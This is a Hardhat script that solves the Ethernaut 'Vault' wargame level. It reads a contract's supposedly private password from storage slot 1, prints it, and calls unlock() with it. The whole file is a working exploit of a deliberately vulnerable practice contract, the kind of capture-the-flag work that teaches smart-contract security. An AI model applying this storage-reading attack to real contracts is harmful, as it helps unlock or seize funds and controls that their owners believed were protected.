import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0xF6b175fA4c972D0C1Ca5F793cb88d4e2ba2a0DaA";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("Vault");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  console.log("Locked Before: ", await contract.locked());

  const password = await ethers.provider.getStorageAt(contract.address, 1);

  console.log(Buffer.from(password.slice(2), "hex").toString());
  await contract.unlock(password);

  console.log("Locked After: ", await contract.locked());

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
